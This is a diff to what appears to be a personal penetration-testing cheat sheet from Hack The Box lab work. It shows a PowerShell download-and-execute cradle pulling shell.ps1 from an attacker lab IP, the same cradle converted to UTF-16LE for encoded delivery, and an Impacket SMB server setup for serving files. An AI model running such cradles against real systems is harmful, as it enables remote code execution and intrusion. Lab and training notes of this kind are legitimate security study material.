@@ -27,14 +27,28 @@ sessions -l :list sessions
 Convert to UTF-16LE
 ===================
 {% highlight bash%}
-root@kali:~# echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.32/shell.ps1')" | xxd | head -3
+root@kali:~# echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.1/shell.ps1')" | xxd | head -3
 00000000: 4945 5828 4e65 772d 4f62 6a65 6374 204e  IEX(New-Object N
 00000010: 6574 2e57 6562 436c 6965 6e74 292e 646f  et.WebClient).do
 00000020: 776e 6c6f 6164 5374 7269 6e67 2827 6874  wnloadString('ht
-root@kali:~# echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.32/shell.ps1')" | iconv -t UTF-16LE | xxd | head -3
+root@kali:~# echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.1/shell.ps1')" | iconv -t UTF-16LE | xxd | head -3
 00000000: 4900 4500 5800 2800 4e00 6500 7700 2d00  I.E.X.(.N.e.w.-.
 00000010: 4f00 6200 6a00 6500 6300 7400 2000 4e00  O.b.j.e.c.t. .N.
 00000020: 6500 7400 2e00 5700 6500 6200 4300 6c00  e.t...W.e.b.C.l.
+{% endhighlight %}
+
+Setting up SMB server
+=====================
+{% highlight bash%}
+root@kali:~/HTB/Json/smb# smbserver.py -username root -password root sharingiscaring $(pwd)
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
 {% endhighlight %}
 
 One Liners
